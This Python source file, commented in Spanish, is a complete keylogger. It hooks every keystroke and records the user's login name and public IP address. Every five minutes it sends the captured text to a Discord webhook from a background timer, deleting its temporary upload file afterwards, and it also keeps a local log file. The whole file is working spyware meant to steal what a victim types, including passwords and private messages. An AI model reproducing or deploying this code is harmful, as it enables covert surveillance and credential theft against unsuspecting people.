import keyboard,os
from threading import Timer
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed
from requests import get

TIEMPO_SALIDA = 300 #el tiempo en el que se actualizara los logs y comparta [segundos]
WEBHOOK = "" #webhook al que sera enviado

class Keylogger: 

    #inicializa los atributos
    def __init__(self, intervalo, metodo):
        now = datetime.now()
        self.intervalo = intervalo # intervalo de tiempo para enviar los logs
        self.metodo = metodo # el metodo que usaremos
        self.log = "" # guarda lo que vamos ingresando
        self.inicio_dt = now.strftime('%d/%m/%Y %H:%M') # saca la fecha actual para saber el inicio
        self.fin_dt = now.strftime('%d/%m/%Y %H:%M') # saca la fecha actual para 
        self.usuario = os.getlogin() # obtiene el nombre de usuario de nuestra computadora
        self.ip = get('https://api.ipify.org/').text # consigue la ip de donde estemos ejecutando con una request de tipo get

    def llamada(self, event):
        tipo = event.name
        if len(tipo) > 1: # si el evento es mayor a un caracter
            if tipo == "space":
                tipo = " "
            elif tipo == "enter":
                tipo = "[ENTER]\n"
            elif tipo == "decimal":
                tipo = "."
            elif tipo == "bloq mayus":
                tipo = ""
            else:  # si detecta una tecla no registrada la manda con su nombre
                tipo = tipo.replace(" ", "_")
                tipo = f"[{tipo.upper()}]"
        self.log += tipo

    def compartir_webhook(self):
        bandera = False
        webhook = DiscordWebhook(url=WEBHOOK)
        if len(self.log) > 2000: # si nuestro log es mas de 2000 caracteres se enviara como txt
            bandera = True
            path = os.environ["temp"] + "\\reporte.txt" #crea la ruta
            with open(path, 'w+') as file: # si no existe lo crea y si existe lo reinicia
                file.write(f"Reporte de {self.usuario} ({self.ip}) Fecha: {self.fin_dt}\n\n")
                file.write(self.log)
            with open(path, 'rb') as f: # lee el archivo
                webhook.add_file(file=f.read(), filename='reporte.txt') # envia el archivo
        else: # si cumple con el tamaño de caracteres lo manda como un embed
            embed = DiscordEmbed(title=f"Reporte de ({self.usuario}) ({self.ip})  Fecha: {self.fin_dt}", description=self.log)
            webhook.add_embed(embed)    
        webhook.execute()
        if bandera:
            os.remove(path) #quita el archivo temporal
    
    def guardar(self):
       # si no existe el archivo lo crea o lo abre
       archivo = open('Keylog.txt','a+')
       archivo.write("\n"+f"# Reporte de ({self.usuario}) Fecha: {self.fin_dt}") # guarda la fecha
       archivo.write("\n"+self.log) # guarda el contenido

    def reportar(self):
        if self.log: #si nuestro log ya tiene datos
            if self.metodo == "webhook":
                try:
                 self.compartir_webhook()  
                except:
                 self.log += "\n# Error al enviar en discord!"
            # ademas de cualquier metodo lo guardaremos en donde se este ejecutando
            self.guardar()
        self.log = "" # reinicia el log
        timer = Timer(interval=self.intervalo, function=self.reportar) 
        timer.daemon = True # se ejecuta en segundo plano
        timer.start() # inicia la funcion del timer

    def inicio(self): 
        keyboard.on_release(callback=self.llamada) # registra el evento
        self.reportar() 
        keyboard.wait() # espera hasta que se ecriba algo
    

if __name__ == "__main__":
    keylogger = Keylogger(intervalo=TIEMPO_SALIDA, metodo="webhook") #Instancia nuestra clase con los parametros deseados
    keylogger.inicio()